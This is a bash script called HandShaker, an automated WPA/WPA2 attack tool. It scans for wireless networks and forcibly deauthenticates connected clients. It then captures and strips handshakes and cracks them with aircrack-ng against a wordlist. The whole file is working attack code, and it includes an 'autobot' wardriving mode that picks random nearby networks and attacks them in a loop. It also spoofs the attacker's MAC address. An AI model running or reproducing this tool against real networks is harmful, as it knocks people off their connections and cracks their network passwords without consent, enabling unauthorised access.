#!/bin/bash

## HandShaker Copyright 2013, d4rkcat (d4rkc4t@tormail.org)
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

fautobot()																#Automagically find active clients and collect new handshakes
{	
	clear
	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -f 750 -a -w $HOME/tmp -o csv --encrypt WPA&
	DONE=""
	$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
	echo
	$COLOR 4;echo " [*] Scanning for active clients.. ";$COLOR 9
	LNUM=0
	while [ $DONE -z ] 2> /dev/null
		do
			sleep 0.3
			echo "$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep ':' | cut -d ',' -f 6)" > $HOME/tmp3
			cat $HOME/tmp3 | tr -d '(not associated)' | sed '/^$/d' | sort -u > $HOME/tmp2
			BSSIDL=$(cat $HOME/tmp2 | sort -R | head -n 1)
			if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSIDL) -z ] 2> /dev/null
				then
					BSSID=$BSSIDL
			fi						
			ESSID=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep WPA | cut -d ',' -f 14 | head -n 1)
			ESSID=${ESSID:1}
			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep WPA | cut -d ',' -f 4 | head -n 1)
			CHAN=$((CHAN + 1 - 1))
			CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
			if [ ${BSSID:2:1} = ":" ] 2> /dev/null
				then
					if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSID) -z ] 2> /dev/null
						then
							DONE=1
						else
							DONE=""
					fi
					if [ $ESSID -z ] 2> /dev/null
						then
							DONE=""
					fi
			fi
			if [ $CLIE -z ] 2>/dev/null
				then
					DONE=""
			fi
		done
	killall airodump-ng
	rm -rf $HOME/tmp*
	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
	DONE=""
	DECNT=0
	while [ $DONE -z ] 2> /dev/null
		do
			clear
			$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
			$COLOR 4;$COLOR2 1; echo " [*] TARGET $ESSID LOADED [*] ";$COLOR 9;$COLOR2 9
			echo
			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE ";$COLOR 9;$COLOR2 9
			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
			echo
			sleep 3
			$COLOR 4;echo " [*] Analyzing pcap for handshake [*] ";$COLOR 9
			sleep 3
			DONE=""
			DONE2=""
			fanalyze
			sleep 0.5
			DECNT=$((DECNT + 1))
			if [ $DECNT -gt 5 ] 2> /dev/null
				then
					killall airodump-ng
					fautobot
			fi
			if [ $GDONE = "1" ] 2> /dev/null
				then
					DONE=1
				else
					$COLOR 1; echo " [*] No handshake detected ";$COLOR 9
					DONE=""
			fi
			done
	GDONE=""
	DONE=""
	killall airodump-ng
	clear
	echo "$BSSID" >> $HOME/Desktop/cap/handshakes/got
	DATE=$( date +%Y_%m_%d_%H%M%S )
	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap" strip | grep 'New pcap-file'
	rm -rf $HOME/tmp*
	clear
	$COLOR 2;$COLOR2 1;echo " [*] Handshake capture was successful!, Horray for AUTOBOT! ";$COLOR 9;$COLOR2 9
	$COLOR 4;echo $DONE;$COLOR 9
	$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap "";$COLOR 9
	echo
	$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT WILL RESUME IN 3 SECONDS [<] ";$COLOR 9;$COLOR2 9
	sleep 3
	fautobot
}		

fanalyze()
{
	
while [ $(echo $ISDONE | grep $BSSID) -z ] 2> /dev/null
	do
		ISDONE=$(pyrit -r $HOME/tmp1-01.cap analyze)
		if  [ $(echo $ISDONE | grep "$ESSID") -z ] 2> /dev/null
			then
				A=1
			else
				break
		fi
	done

while [ $DONE2 -z ] 2> /dev/null
	do
		echo "$ISDONE" > $HOME/tmp4
		if [ $( cat $HOME/tmp4 | grep "bad") -z ] 2> /dev/null
			then
				DONE2=1
		fi
		
		if [ $( cat $HOME/tmp4 | grep "workable") -z ] 2> /dev/null
			then
				A=1
			else
				DONE2=1
				GDONE=1
		fi
		if [ $( cat $HOME/tmp4 | grep "good") -z ] 2> /dev/null
			then
				A=1
			else
				DONE2=1
				GDONE=1
		fi
	done
	
	
}

fapscan()																#Determine target AP BSSID and channel
{
	clear
	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -a -w $HOME/tmp -o csv --encrypt WPA&
	$COLOR 2;echo " [*] Scanning for AP's with names like $PARTIALESSID [*] ";$COLOR 9
	while [ $DONE -z ] 2> /dev/null
		do
			sleep 0.3
			DONE=$(cat $HOME/tmp-01.csv 2> /dev/null | grep $PARTIALESSID)
			ESSID=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 14 | head -n 1)
			if [ $ESSID -z ] 2> /dev/null
				then
					DONE=""
			fi
		done
	sleep 0.5
	killall airodump-ng
	ESSID=${ESSID:1}
	CHAN=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 4 | head -n 1)
	CHAN=$((CHAN + 1 - 1))
	cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 1 | head -n 1 > $HOME/tmp4.csv
	BSSID=$(cat $HOME/tmp4.csv)
	fclientscan
}

flistap()																#List all APs
{
	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -a -w $HOME/tmp -o csv --encrypt WPA&
	clear
	$COLOR 4;echo " [*] Scanning for APs, Please wait.. ";$COLOR 9
	sleep 10
	killall airodump-ng
	echo "$(cat $HOME/tmp-01.csv | grep WPA | cut -d ',' -f 14)" > $HOME/tmp1
	LNUM=0
	while read LINE
		do
			LNUM=$((LNUM + 1))
			case $LNUM in
				1)ESSID1=" [1] $LINE";;
				2)ESSID2=" [2] $LINE";;
				3)ESSID3=" [3] $LINE";;
				4)ESSID4=" [4] $LINE";;
				5)ESSID5=" [5] $LINE";;
				6)ESSID6=" [6] $LINE";;
				7)ESSID7=" [7] $LINE";;
				8)ESSID8=" [8] $LINE";;
				9)ESSID9=" [9] $LINE"
			esac
		done <$HOME/tmp1
	clear
	$COLOR 4;echo " [*] $LNUM APs found:";$COLOR 9
	DNUM=0
	while [ $DNUM -le $LNUM ]
		do
			DNUM=$((DNUM + 1))
			case $DNUM in
				1)echo $ESSID1;;
				2)echo $ESSID2;;
				3)echo $ESSID3;;
				4)echo $ESSID4;;
				5)echo $ESSID5;;
				6)echo $ESSID6;;
				7)echo $ESSID7;;
				8)echo $ESSID8;;
				9)echo $ESSID9
			esac
		done
	$COLOR 4;echo " [>] Please choose an AP ";$COLOR 9
	read -p "  >" AP
	case $AP in
				1)ESSID=${ESSID1:5};;
				2)ESSID=${ESSID2:5};;
				3)ESSID=${ESSID3:5};;
				4)ESSID=${ESSID4:5};;
				5)ESSID=${ESSID5:5};;
				6)ESSID=${ESSID6:5};;
				7)ESSID=${ESSID7:5};;
				8)ESSID=${ESSID8:5};;
				9)ESSID=${ESSID9:5}
	esac
	BSSID=$(cat $HOME/tmp-01.csv | grep WPA | grep $ESSID | cut -d ',' -f 1)
	CHAN=$(cat $HOME/tmp-01.csv | grep WPA | grep $ESSID | cut -d ',' -f 4)
	CHAN=$((CHAN + 1 - 1))
	fclientscan
}

fclientscan()															#Find active clients
{
	rm -rf $HOME/tmp* 2> /dev/null
	CNT="0"
	clear
	$COLOR 2;echo " [*] Attacking $ESSID  BSSID:$BSSID CHANNEL:$CHAN [*] "
	echo
	$COLOR 4;echo ' [*] Please wait while I find active clients.. [*] ';$COLOR 9
	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
	DONE=""
	while [ $DONE -z ] 2> /dev/null
		do
			sleep 0.3
			DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 20 | grep $BSSID)
		done
	DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 20 | grep $BSSID)
	echo "$DONE" > $HOME/tmp
	while read LINE
		do
			echo "${LINE:0:17}" >> $HOME/tmp1
		done <$HOME/tmp
	CNT=$(wc -l $HOME/tmp)
	CNT=${CNT:0:2}
	if [ ${CNT:1:1} = " " ] 2> /dev/null
		then
			CNT=${CNT:0:1}
	fi
	fcap
}

fcap()																	#Deauth, capture and strip handshakes
{
	CHKEX="0"
	if [ $CNT = 1 ] 2> /dev/null
		then
			CLIE=$(head -n 1 $HOME/tmp1)
		else
			$COLOR 2;echo " [*] $CNT active clients found: ";$COLOR 9
			cat $HOME/tmp1
			echo
			$COLOR 4;echo " [>] Please paste client MAC or Press Enter to use the first one: ";$COLOR 9 
			read -p "  >" CLIE
	fi
	if [ $CLIE -z ] 2> /dev/null
		then
			CLIE=$(head -n 1 $HOME/tmp1)
	fi
	DONE=""
	while [ $DONE -z ] 2> /dev/null
		do
			clear
			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE ";$COLOR 9;$COLOR2 9
			echo
			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
			echo
			sleep 3
			$COLOR 4;echo " [*] Analyzing pcap for handshake [*] ";$COLOR 9
			sleep 2
			DONE=$(pyrit -r $HOME/tmp1-01.cap analyze | grep good)
			sleep 0.5
		done
		
	$COLOR 2;echo " [*] Handshake capture successful! "; $COLOR 9
	killall airodump-ng
	clear
	if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSID) -z ] 2>/dev/null
		then
			echo "$BSSID" >> $HOME/Desktop/cap/handshakes/got
	fi
	$COLOR 4;echo " [*] Saving and stripping handshake, please wait... [*] ";$COLOR 9
	DATE=$( date +%Y_%m_%d_%H%M%S )
	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap" strip | grep 'New pcap-file'
	airmon-ng stop mon0
	rm -rf $HOME/tmp*
	clear
	$COLOR 2;echo " [*] Handshake capture was successful!, Horray for you ";$COLOR 9
	echo
	$COLOR 4;echo $DONE;$COLOR 9
	echo
	$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap "";$COLOR 9
	if [ $WORDLIST -z ] 2> /dev/null
		then
			$COLOR 4; echo " [>] Do you want to crack now? [Y/n] ";$COLOR 9
			read -p "  >" DOCRK
			case $DOCRK in
				"")fcrack;;
				"Y")fcrack;;
				"y")fcrack;;
				"n")fexit;;
				"N")fexit
			esac
		else
			fcrack
	fi
	fexit
}

fcrack()																#Crack handshakes
{
	clear
	if [ $WORDLIST -z ] 2> /dev/null
		then
			$COLOR 4;echo " [>] Please enter the full path of a wordlist to use ";$COLOR 9
			read -e -p "  >" WORDLIST
	fi
	if [ ! -f $WORDLIST ] 2> /dev/null
		then
			$COLOR 1;echo " [*] ERROR: $WORDLIST not found, try again..";$COLOR 9
			WORDLIST=""
			sleep 1
			fcrack
		else
			aircrack-ng -w $WORDLIST $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap"
	fi
	fexit
}

fexit()																	#Exit
{
	tput setab 9
	killall aircrack-ng 2> /dev/null
	rm -rf $HOME/tmp* 2> /dev/null
	MOND=$(ifconfig | grep mon0)
	if [ $MOND -z ] 2> /dev/null
		then
			exit
		else
			airmon-ng stop mon0
	fi
	exit
}

fhelp()																	#Help
{
	clear
	echo """ HandShaker - Detect, capture and crack WPA/2 handshakes by partial unique ESSID
	Usage: handshaker x y z
	
			x - Partial unique ESSID
			y - Wireless Interface card
			z - path to wordlist to use for cracking
				
	eg. handshaker Hub3-F wlan0 /usr/share/wordlists/rockyou.txt
	Typing handshaker -a or --autobot gets you autobot or wardriving mode
"""
	exit
}

fstart()																#Startup
{
	COLOR="tput setab"
	COLOR2="tput setaf"
	CHKEX=1
	MOND=$(ifconfig | grep mon0)
	mkdir -p $HOME/Desktop/cap
	mkdir -p $HOME/Desktop/cap/handshakes
	touch $HOME/Desktop/cap/handshakes/got

	if [ $MOND -z ] 2> /dev/null
		then
			clear
			$COLOR 4;echo " [>] Which interface do you want to use?: ";$COLOR 9
			echo
			iwconfig | grep "wlan"
			echo
			read -p "  >wlan" NIC
			NIC="wlan"$NIC
			clear
			airmon-ng start $NIC
			clear
		else
			NIC="mon0"
			clear
	fi
	ifconfig mon0 down
	macchanger -a mon0
	ifconfig mon0 up
	
	if [ $AUTO = "Y" ] 2> /dev/null
		then
			fautobot
	fi
	
	if [ $DO = "L" ] 2> /dev/null
	then
		flistap
	else
		fapscan
	fi
}

trap fexit 2
if [ $# -lt 1 ] 2> /dev/null
	then
		DO="L"
fi
case $1 in
	"-a")AUTO="Y";;
	"--autobot")AUTO="Y"
esac
PARTIALESSID="$1"
if [ $3 -z ] 2> /dev/null
	then
		WORDLIST=""
	else
		WORDLIST=$3
fi
if [ ! -z $2 ] 2> /dev/null
	then
		MOND=$(ifconfig | grep mon0)
		if [ $MOND -z ] 2> /dev/null
			then
				airmon-ng start $2
		fi
fi

if [ $1 = "--help" ] 2> /dev/null
	then
		fhelp
elif [ $1 = "-h" ] 2> /dev/null
	then
		fhelp
fi

fstart
